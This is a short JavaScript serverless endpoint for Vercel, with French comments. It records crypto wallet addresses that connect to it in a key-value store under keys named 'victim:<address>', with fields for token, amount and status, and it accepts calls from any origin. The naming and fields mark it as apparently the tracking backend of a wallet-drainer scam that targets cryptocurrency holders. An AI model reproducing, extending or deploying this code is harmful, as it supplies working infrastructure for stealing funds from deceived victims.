import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { address, chain } = req.body;
    if (!address || typeof address !== 'string' || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
      return res.status(400).json({ error: 'Adresse invalide' });
    }
    try {
      const key = `victim:${address}`;
      // On vérifie si une entrée existe déjà ; si oui on ne l'écrase pas
      const existing = await kv.hgetall(key);
      if (existing) {
        console.log(`📥 Wallet reconnecté : ${address}, déjà enregistré.`);
        return res.status(200).json({ success: true, message: 'already recorded' });
      }
      const timestamp = Date.now();
      await kv.hset(key, {
        chain: chain || 'unknown',
        token: '',
        amount: '0',
        status: 'connected',   // statut initial
        timestamp
      });
      console.log(`🆕 Wallet connecté enregistré : ${address}`);
      return res.status(200).json({ success: true });
    } catch (err) {
      console.error('Erreur record-wallet:', err);
      return res.status(500).json({ error: 'Erreur KV' });
    }
  }

  return res.status(405).json({ error: 'Méthode non autorisée' });
}
